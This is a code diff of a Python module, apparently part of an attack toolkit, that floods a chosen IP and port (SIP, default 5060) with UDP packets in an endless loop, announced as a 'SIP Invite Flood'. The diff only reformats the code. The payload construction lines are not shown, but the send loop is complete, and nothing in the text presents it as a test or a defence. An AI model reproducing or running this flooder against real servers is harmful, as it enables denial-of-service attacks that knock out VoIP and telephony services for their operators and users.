@@ -1,20 +1,18 @@
 import socket
 import random
 
-REQUIRED_OPTIONS = {
-    "IP": "",
-    "PORT": "standar port 5060"
-}
+REQUIRED_OPTIONS = {"IP": "", "PORT": "standar port 5060"}
+
 
 def execute(options):
     ip = options.get("IP")
     port = int(options.get("PORT"))
-    
+
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
+
     print(f"[*] Starting SIP Invite Flood on {ip}:{port}")
     print("[*] Press Ctrl+C to stop the attack.")
-    
+
     count = 0
     try:
         while True:
@@ -30,12 +28,11 @@ def execute(options):
             sock.sendto(payload.encode(), (ip, port))
             count += 1
             print(f"[!] Sent {count} packets...", end="\r")
-                
+
     except KeyboardInterrupt:
         pass
-        
+
     finally:
         sock.close()
-    
-    return True
 
+    return True
